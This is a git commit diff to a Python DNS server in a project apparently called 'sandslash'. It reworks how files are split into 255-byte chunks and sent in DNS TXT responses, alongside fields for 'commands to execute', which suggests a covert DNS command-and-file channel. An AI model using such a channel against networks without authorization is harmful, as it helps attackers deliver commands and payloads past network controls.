638be44f92bfd24897bc79a916d8e0f55e405cf1
Doshmajhan <cpc1007@g.rit.edu>
2016-04-02 05:41:33 +0000

    Files can be successfully fragmented, working on cleaning up code

--- sandslash/answer.py
+++ sandslash/answer.py
@@ -22,8 +22,9 @@ class DNSResponse:
         self.commands = server.commands # commands to execute
         self.f = server.f               # if file is present
         self.fName = server.fName       # name of file
-        self.fSize = 0                  # size of file to load
+        self.fSize = server.fSize       # size of file to load
         self.curr = 0                   # current position in file
+        self.red = 0                    # number of bytes read in the file
         self.server = server
         self.frag = False               # if the file needs to be fragmented
 
@@ -76,7 +77,7 @@ class DNSResponse:
         if self.txt:    # load command
             if self.f:
                 self.load_file(self.fName)
-                if self.curr == self.fSize: # read the whole file, reset now
+                if self.fSize == 0: # read the whole file, reset now
                     self.frag = False
                     self.server.f = False
                     self.server.fName = None
@@ -99,27 +100,32 @@ class DNSResponse:
         f - the name of the file to open
     """
     def load_file(self, f):
-        print "PACKET"
+    
         f = open(f, 'rb')
         if self.frag:
-            if (self.fSize - self.curr) >= 255:
+            # full packet will be filled
+            if (self.fSize - self.red) >= 255:
                 self.packet += struct.pack("!H", 256) #RDLENGTH max file length
                 self.packet += struct.pack("B", 255) #TXTLENGTH(file length)
+            # remaining data of the file
             else:
-                self.packet += struct.pack("!H", (self.fSize - self.curr) + 1)
-                self.packet += struct.pack("B", (self.fSize - self.curr))
+                self.packet += struct.pack("!H", self.fSize + 1) # RDLENGTH
+                self.packet += struct.pack("B", self.fSize) # TXTLENTH
         else:
             self.packet += struct.pack("!H", self.fSize + 1) # RDLENGTH(file length) + txt length field
             self.packet += struct.pack("B", self.fSize) # TXT Length(file length)
-        f.seek(self.curr)
+
+        f.seek(self.curr) # go back to current position
         l = f.read(1)
         while l:
-            if self.curr == 256:        # file to big, need to fragment
+            if self.red == 255:        # file to big, need to fragment
                 break
-            print l
             self.packet += struct.pack("c", l) # load each byte of the packet
             l = f.read(1)
+            self.red += 1
             self.curr += 1
+        self.fSize -= self.red # remove number of bytes read from total size
+        self.red = 0           # reset number of bytes read to zero
         f.close()
         
 
@@ -134,9 +140,9 @@ class DNSResponse:
 def send_response(addr, server, dnsQuery, txt):
     print "Sending response"
     response = DNSResponse(addr, txt, server)
-    if response.fSize > 256: 
-        response.frag = True
-        while response.frag:
+    if response.fSize > 256:  # file is too large, needs to be fragmented
+        response.frag = True  # notify response
+        while response.frag:  # loop until packet is fully fragmented
             response.create_packet(dnsQuery.fullNames[0], dnsQuery.qID)
             server.sock.sendto(bytes(response.packet), addr)
     else:
